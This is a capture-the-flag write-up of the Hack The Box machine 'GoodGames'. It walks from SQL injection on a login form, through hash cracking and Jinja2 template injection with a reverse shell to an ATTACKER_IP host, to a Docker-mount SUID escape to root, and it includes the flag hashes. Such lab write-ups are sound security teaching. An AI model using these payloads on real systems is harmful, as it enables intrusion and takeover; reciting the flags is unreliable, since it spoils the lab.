# HTB GoodGames — Full Writeup

**Platform:** Hack The Box
**Difficulty:** Easy
**OS:** Linux

---

## Overview

GoodGames is an easy Linux machine that demonstrates the importance of sanitizing user inputs to prevent SQL injection, using strong hashing algorithms to protect stored credentials, and avoiding password reuse. The initial foothold involves a blind SQL injection on the login form to extract and crack an admin password hash, followed by discovering an internal administration panel via page source inspection. Server-Side Template Injection (SSTI) in the Flask/Jinja2 admin dashboard yields a root shell inside a Docker container. Privilege escalation exploits a shared mount between the container and host to plant a SUID binary and gain root on the host.

**Full chain:**
```
SQL Injection on login (admin credentials)
  -> Internal admin panel discovery (internal-administration.goodgames.htb)
    -> SSTI in Jinja2 name field (root in Docker container)
      -> SSH to host as augustus (credential reuse)
        -> SUID bash via shared /home/augustus mount (root on host)
```

---

## Reconnaissance

### Open Ports

```bash
nmap -sC -sV -oN nmap/results.md 10.129.96.71
```

* **80/tcp**: HTTP — Werkzeug httpd 2.0.2 (Python 3.9.2), "GoodGames | Community and Store"

No other ports open. Werkzeug debug console (`/console`) not exposed.

### Directory Enumeration

```bash
gobuster dir -u http://10.129.96.71 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 30 --exclude-length 9265
```

> The `--exclude-length 9265` flag is needed because the server returns HTTP 200 with a custom 404 page for all non-existent paths.

Discovered endpoints:
* `/blog` — Blog with posts by Hitman, Witch Murder, Wolfenstein
* `/login` — Login form (POST only)
* `/signup` — User registration
* `/forgot-password` — Password reset
* `/profile` — User profile (authenticated)
* `/logout` — Redirects to home

---

## Initial Access

### SQL Injection on Login

The login form validates email format client-side. Bypassing this with curl allows SQL injection on the `email` parameter:

```bash
curl -s -X POST http://10.129.96.71/login -d "email=' OR 1=1 -- -&password=test"
```

Response: `Welcome admintest` — confirms SQLi and authenticates as the first user in the database.

### Database Enumeration with SQLMap

```bash
sqlmap -u http://10.129.96.71/login --data="email=test&password=test" -p email --batch --dbs
```

* Databases: `information_schema`, `main`
* Injection type: time-based blind (MySQL >= 5.0.12)

```bash
sqlmap -u http://10.129.96.71/login --data="email=test&password=test" -p email --batch -D main --tables
```

* Tables: `user`, `blog`, `blog_comments`

```bash
sqlmap -u http://10.129.96.71/login --data="email=test&password=test" -p email --batch -D main -T user --dump
```

* **admin** / `admin@goodgames.htb` / `2b22337f218b2d82dfc3b6f77e7cb8ec` (MD5)

### Cracking the Hash

```bash
hashcat -m 0 2b22337f218b2d82dfc3b6f77e7cb8ec /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

* Cracked: **`superadministrator`**

### Internal Administration Panel

Logging in as `admin@goodgames.htb` / `superadministrator` and inspecting the page source reveals an admin-only link:

```html
<a href="http://internal-administration.goodgames.htb">
```

```bash
echo "10.129.96.71 internal-administration.goodgames.htb" | sudo tee -a /etc/hosts
```

Browsing to the subdomain presents a Flask Volt admin dashboard. Login with the same credentials succeeds.

### Server-Side Template Injection (SSTI)

The settings page has an editable **Name** field. Testing for Jinja2 SSTI:

* Input: `{{7*7}}` — displayed as `49` (SSTI confirmed)
* RCE test: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` — returned `uid=0(root)`

Reverse shell payload in the name field:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read() }}
```

```bash
nc -lvnp 4444
```

Received root shell inside Docker container (hostname: `3a453ab39d3d`).

---

## Privilege Escalation

### Docker Escape via Shared Mount

From inside the container:

```bash
mount | grep augustus
# /dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

The host's `/home/augustus` directory is mounted into the container. The container IP is `172.19.0.2`, so the host is `172.19.0.1`.

### SSH to Host

After upgrading the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`:

```bash
ssh -o StrictHostKeyChecking=no augustus@172.19.0.1
# Password: superadministrator
```

Credential reuse grants access to the host as `augustus`.

### SUID Bash Exploit

Since the container runs as root and shares `/home/augustus` with the host:

**On the host (augustus):**
```bash
cp /bin/bash /home/augustus/bash
```

**In the container (root):**
```bash
chown root:root /home/augustus/bash
chmod 4755 /home/augustus/bash
```

**Back on the host (augustus):**
```bash
/home/augustus/bash -p
```

Root shell on the host.

---

## Flags

| Flag | Hash | Location |
|------|------|----------|
| user.txt | `d80b01c4ae961620196a358b6aadc6ba` | `/home/augustus/user.txt` |
| root.txt | `c13c253bb6c0bc9cba503d2984a72d5c` | `/root/root.txt` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service enumeration |
| gobuster | Directory brute-forcing |
| curl | Bypassing client-side validation for SQLi |
| sqlmap | Automated SQL injection exploitation |
| hashcat | MD5 hash cracking |
| netcat (nc) | Reverse shell listener |

---

## Key Takeaways

- **Client-side validation is not security** — The login form's email validation was trivially bypassed with curl, exposing the SQL injection vulnerability. Always validate and sanitize on the server side.

- **Weak hashing enables credential theft** — The admin password was stored as an unsalted MD5 hash, cracked in under a second. Use bcrypt, scrypt, or Argon2 for password storage.

- **Inspect page source when authenticated** — The internal admin panel subdomain was only visible in the HTML source when logged in as admin. Tools won't find what's hidden behind authentication.

- **SSTI in Flask/Jinja2 means RCE** — User input reflected in `render_template_string()` allows arbitrary Python execution. Never pass untrusted input to template rendering.

- **Shared Docker mounts break isolation** — Mounting host directories into containers running as root allows trivial privilege escalation via SUID binaries. Minimize mount points and avoid running containers as root.

- **Password reuse bridges attack surfaces** — The same password worked across the web app, admin panel, and SSH, turning a web vulnerability into full host compromise.
